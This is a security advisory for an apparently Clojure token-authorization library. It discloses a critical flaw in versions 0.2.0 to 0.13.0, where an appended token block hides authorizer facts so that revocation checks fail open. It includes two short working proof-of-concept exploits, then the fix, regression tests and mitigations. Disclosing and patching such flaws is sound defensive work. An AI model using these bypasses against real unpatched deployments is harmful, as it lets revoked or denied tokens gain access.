# Security advisory: appended block can hide facts from the authorizer

- **Date:** 2026-11-23
- **Severity:** critical — a revoked or otherwise denied token can be made valid
- **Affected:** every release with origin tracking, 0.2.0 through 0.13.0. Confirmed by test on 0.9.0, 0.11.0, 0.12.0 and 0.13.0; earlier releases use a different token API but the same fact store.
- **Fixed in:** 0.14.0 (see `CHANGELOG.md`)
- **Found by:** follow-up to the 0.12.0 review (`docs/review-swival-inkling-2-mini.md`, finding 6)

## Summary

The fact store kept **one origin set per fact**. When the same fact was derived more than once, the first derivation's origin set won; when the same fact was stated in more than one block, the origin sets were unioned. A fact is visible to a scope only if its origin set is a subset of the scope's trusted origins, so a block appended to a token could give a fact an origin set the authorizer cannot see — hiding it.

Hiding a fact cannot grant authority by itself. But when the hidden fact feeds a **reject check** or a **deny policy**, the check or policy no longer matches, and the token passes. That is a fail-open.

## Who can exploit it

Anyone who can append a block to a token: by design, a token holder may attenuate (add blocks), and blocks are only supposed to _restrict_ authority. Block N sees `#{0 N :authorizer}`, so an appended block can read the authorizer's facts and derive from them.

## Exploit 1: pre-empting the authorizer's rule

Within each fixpoint round, blocks run in order and the authorizer runs last. If an appended block derives the authorizer's fact first, the authorizer's own derivation was skipped as a duplicate:

```clojure
(def token {:blocks [{:facts [[:right "alice" :read] [:token-id "t1"]]}]})

(def authz {:facts    [[:revocation-entry "t1"]]
            :rules    '[{:id :revoked :head [:revoked ?t]
                         :body [[:token-id ?t] [:revocation-entry ?t]]}]
            :checks   '[{:id :not-revoked :kind :reject :query [[:revoked ?t]]}]
            :policies '[{:kind :allow :query [[:right "alice" :read]]}]})

(sw/evaluate token :authorizer authz)
;; => {:valid? false}          ; revoked, correctly denied

(def attacked
  (update token :blocks conj
          {:rules '[{:id :pre-empt :head [:revoked ?t]
                     :body [[:token-id ?t] [:revocation-entry ?t]]}]}))

(sw/evaluate attacked :authorizer authz)
;; affected versions => {:valid? true}
;; [:revoked "t1"] got origin #{0 1 :authorizer}, invisible to the authorizer,
;; so the reject check found nothing.
```

## Exploit 2: restating the authorizer's fact

Simpler still: a fact stated in two places had its origin sets unioned. An appended block that states `[:revocation-entry "t1"]` turns the authorizer's own fact into `#{1 :authorizer}`, which the authorizer cannot see, so its revocation rule never fires:

```clojure
(sw/evaluate (update token :blocks conj {:facts [[:revocation-entry "t1"]]})
             :authorizer authz)
;; affected versions => {:valid? true}
```

## The fix

The store now maps each fact to the **set of minimal origin sets** it was found with (`{fact #{origin-set …}}`), as Biscuit does:

- A scope sees a fact if _any_ of its origin sets is visible to it.
- A new derivation or statement adds its origin set unless the fact already holds a subset of it (which is at least as visible); kept supersets of the new set are dropped. Origins are never unioned across derivations or statements.
- The fixpoint ends when a round adds no (fact, origin set) entry, not when the fact count stops changing.
- `:max-facts` counts (fact, origin set) entries, so many appended blocks re-deriving the same facts cannot grow the store without bound; reaching it still denies.

Both exploits are regression tests (`test/stroopwafel/core_test.clj`: `appended-rule-cannot-hide-a-revocation`, `appended-fact-cannot-hide-an-authorizer-fact`, `later-block-cannot-hide-a-block-0-derivation`), alongside unit tests of the store (`test/stroopwafel/datalog_test.clj`).

## Workarounds for affected versions

There is no complete workaround without upgrading. Partial mitigations:

- Don't derive security-relevant facts (revocation, bans) with authorizer **rules** from facts a block can also see; check the authorizer's stated facts directly in the reject check or deny policy. This blocks exploit 1 but not exploit 2.
- Reject tokens containing blocks that state or derive the predicates your reject checks and deny policies use, before evaluation.

## Compatibility

- `explain`'s fact table reports `:origins` (a set of origin sets) instead of `:origin`; derivations carry the `:origin` they produced; `graph` fact nodes have `:origins`.
- Code that builds a fact store by hand must use the new shape, e.g. `{[:user "alice"] #{#{0}}}`, or `insert-fact` / `insert-facts`.
- Decisions change only where a fact was previously hidden: some tokens that wrongly passed now deny, and some that wrongly denied (a block-0 fact hidden by a later block) now pass.
